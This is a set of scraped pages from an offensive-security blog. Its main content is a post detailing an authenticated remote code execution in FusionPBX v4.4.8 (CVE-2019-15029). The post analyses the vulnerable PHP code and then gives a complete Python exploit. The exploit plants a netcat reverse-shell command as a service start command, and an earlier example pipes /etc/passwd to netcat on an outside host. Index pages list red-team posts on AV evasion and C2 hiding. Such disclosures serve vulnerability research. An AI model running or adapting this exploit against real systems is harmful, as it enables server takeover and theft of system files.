=== Content from shells.systems_c687b664_20250121_001145.html ===


Search for:

Search

[Skip to content](#content)

[Shells.Systems](https://shells.systems/)

WE POP SHELLS

# FusionPBX v4.4.8 authenticated Remote Code Execution (CVE-2019-15029)

Posted on 2019-08-142019-09-23 by [Askar](https://shells.systems/author/askar/)

![](https://shells.systems/wp-content/uploads/2019/08/FusionPBX-metasploit.png)
Estimated Reading Time:  7 minutes
#### Summary about FusionPBX

FusionPBX can be used as a highly available single or domain based multi-tenant PBX, carrier grade switch, call center server, fax server, voip server, voicemail server, conference server, voice application server, appliance framework and more.

#### About the exploit

In this vulnerability the exploit was kind of easy to find and exploit , the exploitation of this vulnerability triggers by creating a new malicious service that holds a “start command” value, which suppose to be a special command to start/stop a service running in the operating system.

The attacker can control the “start command” variable by creating a new services using “service\_edit.php” file which is handled via line #56 as POST value called “service\_cmd\_start” which is checked and filtered by a function called “check\_str()” and then inserted to the database.

After creating the service and inserting it to the database, we can call it via “services.php” by sending a GET request to start the service and execute the stored “start command” which is a controlled by us.

I decided to hunt for a RCE as usual, So I started to list all unsafe functions using a very simple [python script](https://github.com/mhaskar/RCEScanner) I wrote which been used in a previous case studies.

The script gives me a lot of points to start with by showing me all the unsafe functions on the script, and after some digging I found a very obvious piece of code that is appears vulnerable which is line #102 in **/app/services/services.php**which contains**:**

```

	if($service_type == 'svc'){
		if($HAS_WIN_SVC){
			$svc = new win_service($service_data);
			if ($_GET["a"] == "stop") {
				$_SESSION["message"] = $text['message-stopping'].': '.$service_name;
				$svc->stop();
			}
			if ($_GET["a"] == "start") {
				$_SESSION["message"] = $text['message-starting'].': '.$service_name;
				$svc->start();
			}
		}
	}
	else {
		if ($_GET["a"] == "stop") {
			$_SESSION["message"] = $text['message-stopping'].': '.$service_name;
			shell_exec($service_cmd_stop);
		}
		if ($_GET["a"] == "start") {
			$_SESSION["message"] = $text['message-starting'].': '.$service_name;
			shell_exec($service_cmd_start);
		}
	}
	header("Location: services.php");
	return;
}

```

As we can see there is two shell\_exec functions that execute the $service\_cmd\_start and $service\_cmd\_stop variables, and this variables are already called from the database based on line #76 in **services.php** which has the following:

```

if (strlen($_GET["a"]) > 0) {
	$service_uuid = check_str($_GET["id"]);
	$sql = "select * from v_services ";
	$sql .= "where service_uuid = '$service_uuid' ";
	$prep_statement = $db->prepare(check_sql($sql));
	$prep_statement->execute();
	$result = $prep_statement->fetchAll(PDO::FETCH_NAMED);
	foreach ($result as &$row) {
		$domain_uuid = $row["domain_uuid"];
		$service_name = $row["service_name"];
		$service_type = $row["service_type"];
		$service_data = $row["service_data"];
		$service_cmd_start = $row["service_cmd_start"];
		$service_cmd_stop = $row["service_cmd_stop"];
		$service_description = $row["service_description"];
	}

```

From the previous code we can see that the script make a query to the database and extract the service information which has the raw value “service\_cmd\_start” saved to $service\_cmd\_start variable which will be passed later on to shell\_exec line #102 on **services.php.**

Now we need to find the code that handles the creating of a new service , which is “**service\_edit.php**” this file will create a new service or edit an existing service for you, after some digging in the code I found the required piece which is:

```

//action add or update

	if (isset($_REQUEST["id"])) {
		$action = "update";
		$service_uuid = check_str($_REQUEST["id"]);
	}
	else {
		$action = "add";
	}
//get http post and set it to php variables
	if (count($_POST)>0) {
		$service_name = check_str($_POST["service_name"]);
		$service_type = check_str($_POST["service_type"]);
		$service_data = check_str($_POST["service_data"]);
		$service_cmd_start = check_str($_POST["service_cmd_start"]);
		$service_cmd_stop = check_str($_POST["service_cmd_stop"]);
		$service_description = check_str($_POST["service_description"]);
	}

```

As we can see this piece of code are responsible about handling the POST requests to “**edit\_service.php**” and as we can see in line #56 the service\_cmd\_start POST value is stored in $service\_cmd\_start variable and passed to **check\_str** function, and will be inserted to the database by the following code :

```

	if ($_POST["persistformvar"] != "true") {
			if ($action == "add" && permission_exists('service_add')) {
				$service_uuid = uuid();
				$sql = "insert into v_services ";
				$sql .= "(";
				$sql .= "domain_uuid, ";
				$sql .= "service_uuid, ";
				$sql .= "service_name, ";
				$sql .= "service_type, ";
				$sql .= "service_data, ";
				$sql .= "service_cmd_start, ";
				$sql .= "service_cmd_stop, ";
				$sql .= "service_description ";
				$sql .= ")";
				$sql .= "values ";
				$sql .= "(";
				$sql .= "'$domain_uuid', ";
				$sql .= "'$service_uuid', ";
				$sql .= "'$service_name', ";
				$sql .= "'$service_type', ";
				$sql .= "'$service_data', ";
				$sql .= "'$service_cmd_start', ";
				$sql .= "'$service_cmd_stop', ";
				$sql .= "'$service_description' ";
				$sql .= ")";
				$db->exec(check_sql($sql));
				unset($sql);
				messages::add($text['message-add']);
				header("Location: services.php");
				return;
			} //if ($action == "add")

```

As we can see in line #111 the value will be inserted for the required service, and from here we can conclude that we can do the following to get RCE:

Login ==> Create service with malicious start command ==> start the service

And as I mentioned before the $\_POST[‘service\_cmd\_start’] is passed to check\_str function which is existed in “**/resources/functions.php**” line #62 and do the following:

```

			function check_str($string, $trim = true) {
			global $db_type, $db;
			//when code in db is urlencoded the ' does not need to be modified
			if ($db_type == "sqlite") {
				if (function_exists('sqlite_escape_string')) {
					$string = sqlite_escape_string($string);
				}
				else {
					$string = str_replace("'","''",$string);
				}
			}
			if ($db_type == "pgsql") {
				$string = pg_escape_string($string);
			}
			if ($db_type == "mysql") {
				if(function_exists('mysql_real_escape_string')){
					$tmp_str = mysql_real_escape_string($string);
				}
				else{
					$tmp_str = mysqli_real_escape_string($db, $string);
				}
				if (strlen($tmp_str)) {
					$string = $tmp_str;
				}
				else {
					$search = array("\x00", "\n", "\r", "\\", "'", "\"", "\x1a");
					$replace = array("\\x00", "\\n", "\\r", "\\\\" ,"\'", "\\\"", "\\\x1a");
					$string = str_replace($search, $replace, $string);
				}
			}
			$string = ($trim) ? trim($string) : $string;
			return $string;
		}

```

And as we can see that the function is responsible about filtering the text from any character that can used to perform sql injection attacks based on the DMBS that is configured with FusionPBX, and we can see that that function doesn’t filter any shell commands or check for special characters used during command injection , so we can insert any command we want without any restrictions, and here is BIG mistake by the software logic made by the developers, they allow any service with any command to be inserted and executed even if the service is not existed or the command has malicious usage !

Let’s back to “services.php” code and see how we can trigger our command.

```

if (strlen($_GET["a"]) > 0) {

	$service_uuid = check_str($_GET["id"]);
	$sql = "select * from v_services ";
	$sql .= "where service_uuid = '$service_uuid' ";
	$prep_statement = $db->prepare(check_sql($sql));
	$prep_statement->execute();
	$result = $prep_statement->fetchAll(PDO::FETCH_NAMED);
	foreach ($result as &$row) {
		$domain_uuid = $row["domain_uuid"];
		$service_name = $row["service_name"];
		$service_type = $row["service_type"];
		$service_data = $row["service_data"];
		$service_cmd_start = $row["service_cmd_start"];
		$service_cmd_stop = $row["service_cmd_stop"];
		$service_description = $row["service_description"];
	}
	unset ($prep_statement);
	if($service_type == 'svc'){
		if($HAS_WIN_SVC){
			$svc = new win_service($service_data);
			if ($_GET["a"] == "stop") {
				$_SESSION["message"] = $text['message-stopping'].': '.$service_name;
				$svc->stop();
			}
			if ($_GET["a"] == "start") {
				$_SESSION["message"] = $text['message-starting'].': '.$service_name;
				$svc->start();
			}
		}
	}
	else {
		if ($_GET["a"] == "stop") {
			$_SESSION["message"] = $text['message-stopping'].': '.$service_name;
			shell_exec($service_cmd_stop);
		}
		if ($_GET["a"] == "start") {
			$_SESSION["message"] = $text['message-starting'].': '.$service_name;
			shell_exec($service_cmd_start);
		}
	}
	header("Location: services.php");
	return;
}

```

We need to pass the service id as $\_GET[‘id’] in line #65 which will extract the values from the database “service\_cmd\_start” contains with them of course, and then pass $\_GET[‘a’] as start to call the service\_cmd\_start which will passed to shell\_exec in line #100 and by theory we can have our command executed !

So I will try to execute this scenario via Burpsuite like the following:

![](https://shells.systems/wp-content/uploads/2019/08/BurpAddService.png)

As we can see the service has been added with the command “cat /etc/passwd | nc 172.0.1.3 1337” and we can see the service id in browser is “8f62e4b0-95be-4567-9c84-1776b4c0d5d5”, So we can trigger it by visiting the URL services.php?id=8f62e4b0-95be-4567-9c84-1776b4c0d5d5&a=start and we will have the following:

![](https://shells.systems/wp-content/uploads/2019/08/FusionGotReverse.png)

We got the command executed !!

#### Exploit Writing

After getting the code executed using burp, we need to automate the exploitation process , and I will break down the steps that we need in order to get RCE:

* Login to FusionPBX.
* Create a new service contains service\_cmd\_start as our payload.
* Get the service\_id.
* Make a request to services.php with the service\_id and parameter a=start.

The final python exploit code will be:

```

#!/usr/bin/python3

'''
# Exploit Title: FusionPBX v4.4.8 authenticated Remote Code Execution
# Date: 13/08/2019
# Exploit Author: Askar (@mohammadaskar2)
# CVE : 2019-15029
# Vendor Homepage: https://www.fusionpbx.com
# Software link: https://www.fusionpbx.com/download
# Version: v4.4.8
# Tested on: Ubuntu 18.04 / PHP 7.2
'''

import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import sys
import warnings
from bs4 import BeautifulSoup

# turn off BeautifulSoup and requests warnings
warnings.filterwarnings("ignore", category=UserWarning, module='bs4')
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

if len(sys.argv) != 6:
    print(len(sys.argv))
    print("[~] Usage : ./FusionPBX-exploit.py url username password ip port")
    print("[~] ./exploit.py http://example.com admin p@$$word 172.0.1.3 1337")

    exit()

url = sys.argv[1]
username = sys.argv[2]
password = sys.argv[3]
ip = sys.argv[4]
port = sys.argv[5]

request = requests.session()

login_info = {
    "username": username,
    "password": password
}

login_request = request.post(
    url+"/core/user_settings/user_dashboard.php",
     login_info, verify=False
 )

if "Invalid Username and/or Password" not in login_request.text:
    print("[+] Logged in successfully")
else:
    print("[+] Error with creds")

service_edit_page = url + "/app/services/service_edit.php"
services_page = url + "/app/services/services.php"
payload_info = {
    # the service name you want to create
    "service_name":"PwnedService3",
    "service_type":"pid",
    "service_data":"1",

    # this value contains the payload , you can change it as you want
    "service_cmd_start":"rm /tmp/z;mkfifo /tmp/z;cat /tmp/z|/bin/sh -i 2>&1|nc 172.0.1.3 1337 >/tmp/z",
    "service_cmd_stop":"stop",
    "service_description":"desc",
    "submit":"Save"
}

request.post(service_edit_page, payload_info, verify=False)
html_page = request.get(services_page, verify=False)

soup = BeautifulSoup(html_page.text, "lxml")

for a in soup.find_all(href=True):
    if "PwnedService3" in a:
        sid = a["href"].split("=")[1]
        break

service_page = url + "/app/services/services.php?id=" + sid + "&a=start"
print("[+] Triggering the exploit , check your netcat !")
request.get(service_page, verify=False)

```

You can find the exploit code [here](https://gist.github.com/mhaskar/7a6a804cd68c7fec4f9d1f5c3507900f), and the exploit result will be like the following:

![](https://shells.systems/wp-content/uploads/2019/08/FinalShell.png)
#### Metasploit Module

Also I wrote a Metasploit module to exploit this RCE with this code, you can find it [here](https://gist.github.com/mhaskar/367c38e0db874acb28fa08d74251d054).

And the results will be:

![](https://shells.systems/wp-content/uploads/2019/08/FusionPBX-metasploit.png)

We popped a shell !

Categories[static code analysis](https://shells.systems/category/static-code-analysis/)Tags[code analysis](https://shells.systems/tag/code-analysis/), [FusionPBX](https://shells.systems/tag/fusionpbx/), [metasploit](https://shells.systems/tag/metasploit/), [php](https://shells.systems/tag/php/), [python](https://shells.systems/tag/python/)
![](https://secure.gravatar.com/avatar/d6fbc3936f8273307f861bc80d82b490?s=72&d=mm&r=g)

[Askar](https://shells.systems/author/askar/ "Posts by Askar")

I write codes that break codes, Hacker wannabe.

## Post navigation

[PreviousPrevious post: Centreon v19.04 Remote Code Execution (CVE-2019-13024)](https://shells.systems/centreon-v19-04-remote-code-execution-cve-2019-13024/)[NextNext post: rConfig v3.9.2 authenticated and unauthenticated RCE (CVE-2019-16663) and (CVE-2019-16662)](https://shells.systems/rconfig-v3-9-2-authenticated-and-unauthenticated-rce-cve-2019-16663-and-cve-2019-16662/)

### Leave a Reply [Cancel reply](/fusionpbx-v4-4-8-authenticated-remote-code-execution-cve-2019-15029/#respond)

Your email address will not be published. Required fields are marked \*

Comment

Name \*

Email \*

Website

Δ

[Proudly powered by WordPress](https://wordpress.org/)



=== Content from drive.google.com_ea610306_20250121_001142.html ===
[Sign in](https://accounts.google.com/ServiceLogin?service=wise&passive=1209600&osid=1&continue=https://drive.google.com/file/d/1bt08NSUaxu87LJJGdNd7LpvZ2uGauRK8/view?usp%3Dsharing&followup=https://drive.google.com/file/d/1bt08NSUaxu87LJJGdNd7LpvZ2uGauRK8/view?usp%3Dsharing&ec=GAZAGQ)

=== Content from shells.systems_a59b9094_20250121_021916.html ===


Search for:

Search

[Skip to content](#content)

# [Shells.Systems](https://shells.systems/)

WE POP SHELLS

## [PandoraFMS v7.0NG.777.3 Remote Command Execution (CVE-2024-11320)](https://shells.systems/pandorafms-v7-0ng-777-3-remote-command-execution-cve-2024-11320/)

Posted on 2025-01-052025-01-05 by [Askar](https://shells.systems/author/askar/)

[![PandoraFMS v7.0NG.777.3 Remote Command Execution (CVE-2024-11320)](https://shells.systems/wp-content/uploads/2025/01/pandora-poc.png)](https://shells.systems/pandorafms-v7-0ng-777-3-remote-command-execution-cve-2024-11320/)

Estimated Reading Time:  9 minutes Previously, during a quick code review of PandoraFMS, I identified CVE-2019-20224, an RCE vulnerability affecting the product. In this blog post, I’ll delve into another code review of PandoraFMS that uncovered a new RCE vulnerability, now assigned CVE-2024-11320. This post is the first in a two-part series focused on CVE-2024-11320. In this part, I’ll walk…

Categories[AppSec](https://shells.systems/category/appsec/), [static code analysis](https://shells.systems/category/static-code-analysis/)

## [Extracting Plaintext Credentials from Palo Alto Global Protect](https://shells.systems/extracting-plaintext-credentials-from-palo-alto-global-protect/)

Posted on 2024-11-192024-11-19 by [Ian](https://shells.systems/author/ianl/)

[![Extracting Plaintext Credentials from Palo Alto Global Protect](https://shells.systems/wp-content/uploads/2024/11/image.png)](https://shells.systems/extracting-plaintext-credentials-from-palo-alto-global-protect/)

Estimated Reading Time:  5 minutes On a recent Red Team engagement, I was poking around having a look at different files and trying to see if I could extract any information that would allow me to move laterally through the network. I was hopeful, as always, that I would land on domain\_admin\_passwords\_2024.xlsx or something (don’t laugh – we’ve all found…

Categories[Red Team](https://shells.systems/category/red-team/), [Uncategorized](https://shells.systems/category/uncategorized/)

## [Cortex XDR Ransomware Protection, Chocolate Teapots and Inflatable Dartboards﻿](https://shells.systems/cortex-xdr-ransomware-protection-chocolate-teapots-and-inflatable-dartboards%EF%BB%BF/)

Posted on 2024-07-252024-08-05 by [Ian](https://shells.systems/author/ianl/)

[![Cortex XDR Ransomware Protection, Chocolate Teapots and Inflatable Dartboards﻿](https://shells.systems/wp-content/uploads/2024/07/Picture10-1.png)](https://shells.systems/cortex-xdr-ransomware-protection-chocolate-teapots-and-inflatable-dartboards%EF%BB%BF/)

Estimated Reading Time:  6 minutes A post exploring how to enumerate and avoid Cortex XDR ransomware files/folders and avoid getting caught

Categories[AppSec](https://shells.systems/category/appsec/), [Red Team](https://shells.systems/category/red-team/)

## [Froxlor v2.0.6 Remote Command Execution (CVE-2023-0315)](https://shells.systems/froxlor-v2-0-6-remote-command-execution-cve-2023-0315/)

Posted on 2023-01-292023-01-29 by [Askar](https://shells.systems/author/askar/)

[![Froxlor v2.0.6 Remote Command Execution (CVE-2023-0315)](https://shells.systems/wp-content/uploads/2023/01/froxlor-rce.png)](https://shells.systems/froxlor-v2-0-6-remote-command-execution-cve-2023-0315/)

Estimated Reading Time:  8 minutes Summary about Froxlor Froxlor is a web-based server management software for Linux-based operating systems. It is primarily used to manage web hosting environments and allows users to create and manage websites, email accounts, and FTP accounts. It also provides tools for monitoring server resources and managing backups. Froxlor is written in PHP and uses a…

Categories[AppSec](https://shells.systems/category/appsec/), [static code analysis](https://shells.systems/category/static-code-analysis/)

## [APT-HUNTER V3.0 : Rebuilt with Multiprocessing and new features](https://shells.systems/apt-hunter-v3-0-rebuilt-with-multiprocessing-and-new-cool-features/)

Posted on 2023-01-252023-01-29 by [Ahmed Khlief](https://shells.systems/author/ahmedkhlief/)

[![APT-HUNTER V3.0 : Rebuilt with Multiprocessing and new features](https://shells.systems/wp-content/uploads/2023/01/logo.png)](https://shells.systems/apt-hunter-v3-0-rebuilt-with-multiprocessing-and-new-cool-features/)

Estimated Reading Time:  2 minutes Since last release i was working on new features and to increase the processing speed for large number of windows event logs files so i rebuilt the tool to use multiprocessing and added more feature that will help you in your next investigation. Download from here : https://github.com/ahmedkhlief/APT-Hunter/releases/tag/V3.0 APT-HUNTER V3.0 Features New use cases based…

Categories[Purple Team](https://shells.systems/category/purple-team/)

## [Bypassing AppLocker by abusing HashInfo](https://shells.systems/post-bypassing-applocker-by-abusing-hashinfo/)

Posted on 2022-08-192024-07-25 by [Ian](https://shells.systems/author/ianl/)

[![Bypassing AppLocker by abusing HashInfo](https://shells.systems/wp-content/uploads/2022/08/image-13.png)](https://shells.systems/post-bypassing-applocker-by-abusing-hashinfo/)

Estimated Reading Time:  4 minutes This article is based mostly on the work of Grzegorz Tworek (@0gtweet) I recently saw this tweet from Grzegorz Tworek (@0gtweet – who if you aren’t following you really should be!) come across my timeline I had seen previous tweets referencing the AppLocker hash/signature cache and having a CPD day I thought I would take…

Categories[Red Team](https://shells.systems/category/red-team/)

## [Oh my API, abusing TYK cloud API management to hide your malicious C2 traffic](https://shells.systems/oh-my-api-abusing-tyk-cloud-api-management-service-to-hide-your-malicious-c2-traffic/)

Posted on 2022-06-182022-06-19 by [Askar](https://shells.systems/author/askar/)

[![Oh my API, abusing TYK cloud API management to hide your malicious C2 traffic](https://shells.systems/wp-content/uploads/2022/06/TYK-CS-org.png)](https://shells.systems/oh-my-api-abusing-tyk-cloud-api-management-service-to-hide-your-malicious-c2-traffic/)

Estimated Reading Time:  10 minutes Hiding your malicious C2 traffic through legitimate channels is challenging nowadays, especially while CDN providers block all known techniques to use domain fronting to hide your malicious traffic. For that reason, I was looking for a service that I can (ab)use to forward and hide my malicious C2 traffic using their domains without exposing my…

Categories[Red Team](https://shells.systems/category/red-team/)

## [NinjaC2 V2.2 Released with New Features](https://shells.systems/ninjac2-v2-2-released-with-new-features/)

Posted on 2022-04-092022-04-10 by [Ahmed Khlief](https://shells.systems/author/ahmedkhlief/)

[![NinjaC2 V2.2 Released with New Features](https://shells.systems/wp-content/uploads/2022/04/Screenshot-from-2022-04-10-21-31-01.png)](https://shells.systems/ninjac2-v2-2-released-with-new-features/)

Estimated Reading Time:  3 minutes NinjaC2 v2.2 include new features including : NinjaC2 can be downloaded from github Enhanced User interface New Amazon Web Services EC2 instance creation automation : deploy Ninja to new AWS instance in 5 minutes. More organized file management Now every campaign has its own folder that contain files and configuration. Updated Mimikatz script Fixes for…

Categories[Red Team](https://shells.systems/category/red-team/)

## [DNSStager v1.0 stable: Stealthier code, DLL agent & much more](https://shells.systems/dnsstager-v1-0-stable-stealthier-code-dll-agent-much-more/)

Posted on 2022-02-012022-02-01 by [Askar](https://shells.systems/author/askar/)

[![DNSStager v1.0 stable: Stealthier code, DLL agent & much more](https://shells.systems/wp-content/uploads/2022/02/DNSStagerWorking.png)](https://shells.systems/dnsstager-v1-0-stable-stealthier-code-dll-agent-much-more/)

Estimated Reading Time:  3 minutes In the past year, I published the first version of DNSStager which is a tool to hide your payload in DNS, and presented an updated version of it at BlackHat Europe 2021 and @Hack conferences. Today I’m happy to announce that the Stable version of DNSStager is out with some new features and fixes for…

Categories[Red Team](https://shells.systems/category/red-team/)

## [APT-Hunter V2.0 : More than 200 use cases and new features](https://shells.systems/apt-hunter-v2-0-more-than-200-use-cases-and-new-features/)

Posted on 2021-11-062022-04-10 by [Ahmed Khlief](https://shells.systems/author/ahmedkhlief/)

[![APT-Hunter V2.0 : More than 200 use cases and new features](https://shells.systems/wp-content/uploads/2021/11/Screenshot-from-2021-11-06-13-26-25.png)](https://shells.systems/apt-hunter-v2-0-more-than-200-use-cases-and-new-features/)

Estimated Reading Time:  5 minutes APT-Hunter first released at the beginning of 2021 and since the release, many use cases and features were added along with bug fixes . APT-Hunter V2.0 now includes more than 200 use cases , log hunting , new frequency analysis , very easy to use and analyze multiple devices logs at same time . Github…

Categories[Purple Team](https://shells.systems/category/purple-team/)

[Older posts →](https://shells.systems/page/2/)

[Proudly powered by WordPress](https://wordpress.org/)



=== Content from shells.systems_34a8bce5_20250121_021917.html ===


Search for:

Search

[Skip to content](#content)

[Shells.Systems](https://shells.systems/)

WE POP SHELLS

# Author: Askar

I write codes that break codes, Hacker wannabe.
## [PandoraFMS v7.0NG.777.3 Remote Command Execution (CVE-2024-11320)](https://shells.systems/pandorafms-v7-0ng-777-3-remote-command-execution-cve-2024-11320/)

Posted on 2025-01-052025-01-05 by [Askar](https://shells.systems/author/askar/)

[![PandoraFMS v7.0NG.777.3 Remote Command Execution (CVE-2024-11320)](https://shells.systems/wp-content/uploads/2025/01/pandora-poc.png)](https://shells.systems/pandorafms-v7-0ng-777-3-remote-command-execution-cve-2024-11320/)

Estimated Reading Time:  9 minutes Previously, during a quick code review of PandoraFMS, I identified CVE-2019-20224, an RCE vulnerability affecting the product. In this blog post, I’ll delve into another code review of PandoraFMS that uncovered a new RCE vulnerability, now assigned CVE-2024-11320. This post is the first in a two-part series focused on CVE-2024-11320. In this part, I’ll walk…

Categories[AppSec](https://shells.systems/category/appsec/), [static code analysis](https://shells.systems/category/static-code-analysis/)

## [Froxlor v2.0.6 Remote Command Execution (CVE-2023-0315)](https://shells.systems/froxlor-v2-0-6-remote-command-execution-cve-2023-0315/)

Posted on 2023-01-292023-01-29 by [Askar](https://shells.systems/author/askar/)

[![Froxlor v2.0.6 Remote Command Execution (CVE-2023-0315)](https://shells.systems/wp-content/uploads/2023/01/froxlor-rce.png)](https://shells.systems/froxlor-v2-0-6-remote-command-execution-cve-2023-0315/)

Estimated Reading Time:  8 minutes Summary about Froxlor Froxlor is a web-based server management software for Linux-based operating systems. It is primarily used to manage web hosting environments and allows users to create and manage websites, email accounts, and FTP accounts. It also provides tools for monitoring server resources and managing backups. Froxlor is written in PHP and uses a…

Categories[AppSec](https://shells.systems/category/appsec/), [static code analysis](https://shells.systems/category/static-code-analysis/)

## [Oh my API, abusing TYK cloud API management to hide your malicious C2 traffic](https://shells.systems/oh-my-api-abusing-tyk-cloud-api-management-service-to-hide-your-malicious-c2-traffic/)

Posted on 2022-06-182022-06-19 by [Askar](https://shells.systems/author/askar/)

[![Oh my API, abusing TYK cloud API management to hide your malicious C2 traffic](https://shells.systems/wp-content/uploads/2022/06/TYK-CS-org.png)](https://shells.systems/oh-my-api-abusing-tyk-cloud-api-management-service-to-hide-your-malicious-c2-traffic/)

Estimated Reading Time:  10 minutes Hiding your malicious C2 traffic through legitimate channels is challenging nowadays, especially while CDN providers block all known techniques to use domain fronting to hide your malicious traffic. For that reason, I was looking for a service that I can (ab)use to forward and hide my malicious C2 traffic using their domains without exposing my…

Categories[Red Team](https://shells.systems/category/red-team/)

## [DNSStager v1.0 stable: Stealthier code, DLL agent & much more](https://shells.systems/dnsstager-v1-0-stable-stealthier-code-dll-agent-much-more/)

Posted on 2022-02-012022-02-01 by [Askar](https://shells.systems/author/askar/)

[![DNSStager v1.0 stable: Stealthier code, DLL agent & much more](https://shells.systems/wp-content/uploads/2022/02/DNSStagerWorking.png)](https://shells.systems/dnsstager-v1-0-stable-stealthier-code-dll-agent-much-more/)

Estimated Reading Time:  3 minutes In the past year, I published the first version of DNSStager which is a tool to hide your payload in DNS, and presented an updated version of it at BlackHat Europe 2021 and @Hack conferences. Today I’m happy to announce that the Stable version of DNSStager is out with some new features and fixes for…

Categories[Red Team](https://shells.systems/category/red-team/)

## [Unveiling DNSStager: A tool to hide your payload in DNS](https://shells.systems/unveiling-dnsstager-a-tool-to-hide-your-payload-in-dns/)

Posted on 2021-05-232021-07-06 by [Askar](https://shells.systems/author/askar/)

[![Unveiling DNSStager: A tool to hide your payload in DNS](https://shells.systems/wp-content/uploads/2021/05/DNSStagerObservation.gif)](https://shells.systems/unveiling-dnsstager-a-tool-to-hide-your-payload-in-dns/)

Estimated Reading Time:  8 minutes In the past few weeks, I was working on a new project that could help me to solve an issue during a case I was facing, I needed a tool to help me pulling off my payload through DNS without being noisy or suspicious with the ability to inject this payload to the memory and…

Categories[Red Team](https://shells.systems/category/red-team/)

## [Unveiling BugHound: a static code analysis tool based on ElasticSearch](https://shells.systems/unveiling-bughound-a-static-code-analysis-tool-based-on-elasticsearch/)

Posted on 2021-01-242021-01-24 by [Askar](https://shells.systems/author/askar/)

[![Unveiling BugHound: a static code analysis tool based on ElasticSearch](https://shells.systems/wp-content/uploads/2021/01/Bughound-Logo.png)](https://shells.systems/unveiling-bughound-a-static-code-analysis-tool-based-on-elasticsearch/)

Estimated Reading Time:  7 minutes In the last couple of weeks, I was doing some code analysis for a couple of products, some of them were part of my daily job and the other was for research purposes. During this period, I was trying to do automation for my code analysis process to reduce the amount of work that I…

Categories[AppSec](https://shells.systems/category/appsec/), [static code analysis](https://shells.systems/category/static-code-analysis/)

## [Defeat Bitdefender total security using windows API unhooking to perform process injection](https://shells.systems/defeat-bitdefender-total-security-using-windows-api-unhooking-to-perform-process-injection/)

Posted on 2020-10-042020-10-04 by [Askar](https://shells.systems/author/askar/)

[![Defeat Bitdefender total security using windows API unhooking to perform process injection](https://shells.systems/wp-content/uploads/2020/10/CreateRemoteThread-reached-after-patch.png)](https://shells.systems/defeat-bitdefender-total-security-using-windows-api-unhooking-to-perform-process-injection/)

Estimated Reading Time:  14 minutes Bypassing endpoint protections such as AVs/EDRs is a phase that you need to take care of when you prepare for your red team operation, it could take some time to understand how these solutions are working before you try to bypass them. And with the large number of resources published online on this topic, it…

Categories[Red Team](https://shells.systems/category/red-team/)

## [Octopus v1.2 stable: shellcode generation, spoofed args agent & much more!](https://shells.systems/octopus-v1-2-stable-shellcode-generation-spoofed-args-agent-and-much-more/)

Posted on 2020-08-282020-08-28 by [Askar](https://shells.systems/author/askar/)

[![Octopus v1.2 stable: shellcode generation, spoofed args agent & much more!](https://shells.systems/wp-content/uploads/2020/08/Octopus-spoofed-args-results-2.png)](https://shells.systems/octopus-v1-2-stable-shellcode-generation-spoofed-args-agent-and-much-more/)

Estimated Reading Time:  4 minutes It’s been a while since I released the stable version of Octopus, and today, I’m glad to announce that version 1.2 from Octopus is out! We added new features to this version and fixed some issues from the previous one to make it more stable. With time going by, we noticed that Octopus usage is…

Categories[Red Team](https://shells.systems/category/red-team/)

## [In-Memory shellcode decoding to evade AVs/EDRs](https://shells.systems/in-memory-shellcode-decoding-to-evade-avs/)

Posted on 2020-07-262020-07-27 by [Askar](https://shells.systems/author/askar/)

[![In-Memory shellcode decoding to evade AVs/EDRs](https://shells.systems/wp-content/uploads/2020/07/Shellcode-Wrote-CreateRemoteThread.png)](https://shells.systems/in-memory-shellcode-decoding-to-evade-avs/)

Estimated Reading Time:  9 minutes During the previous week, I was doing some research about win32 APIs and how we can use them during weaponizing our attack, I already did some work related to process injection in the past, but I was looking for something more advanced and to do an extra mile in process injection. So, I took my…

Categories[Red Team](https://shells.systems/category/red-team/)

## [OCS Inventory NG v2.7 Remote Command Execution (CVE-2020-14947)](https://shells.systems/ocs-inventory-ng-v2-7-remote-command-execution-cve-2020-14947/)

Posted on 2020-06-292020-06-29 by [Askar](https://shells.systems/author/askar/)

[![OCS Inventory NG v2.7 Remote Command Execution (CVE-2020-14947)](https://shells.systems/wp-content/uploads/2020/06/OCS-final-exploit.png)](https://shells.systems/ocs-inventory-ng-v2-7-remote-command-execution-cve-2020-14947/)

Estimated Reading Time:  7 minutes Summary of OCS Inventory NG Open Computer and Software Inventory Next Generation is free software that enables users to inventory IT assets. OCS-NG collects information about the hardware and software of networked machines running the OCS client program. OCS can visualize the inventory through a web interface. About the exploit I found this vulnerability by…

Categories[static code analysis](https://shells.systems/category/static-code-analysis/)

[Older posts →](https://shells.systems/author/askar/page/2/)

[Proudly powered by WordPress](https://wordpress.org/)



=== Content from gist.github.com_39f94b20_20250121_001144.html ===

[Skip to content](#start-of-content)

[All gists](/discover)
[Back to GitHub](https://github.com)
[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2Fmhaskar%2F7a6a804cd68c7fec4f9d1f5c3507900f)
[Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2Fmhaskar%2F7a6a804cd68c7fec4f9d1f5c3507900f&source=header-gist)

[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2Fmhaskar%2F7a6a804cd68c7fec4f9d1f5c3507900f) [Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2Fmhaskar%2F7a6a804cd68c7fec4f9d1f5c3507900f&source=header-gist)

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

Instantly share code, notes, and snippets.

[![@mhaskar](https://avatars.githubusercontent.com/u/6861215?s=64&v=4)](/mhaskar)

# [mhaskar](/mhaskar)/**[FusionPBX-exploit.py](/mhaskar/7a6a804cd68c7fec4f9d1f5c3507900f)** Secret

Last active
June 15, 2020 02:39

Show Gist options

* [Download ZIP](/mhaskar/7a6a804cd68c7fec4f9d1f5c3507900f/archive/c9b225952e4c52ee96ddf1dcf73afe16e073c3cf.zip)

* [Star
  (0)
  0](/login?return_to=https%3A%2F%2Fgist.github.com%2Fmhaskar%2F7a6a804cd68c7fec4f9d1f5c3507900f)You must be signed in to star a gist
* [Fork
  (0)
  0](/login?return_to=https%3A%2F%2Fgist.github.com%2Fmhaskar%2F7a6a804cd68c7fec4f9d1f5c3507900f)You must be signed in to fork a gist

* Embed

  + Embed
     Embed this gist in your website.
  + Share
     Copy sharable link for this gist.
  + Clone via HTTPS
     Clone using the web URL.
  + [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

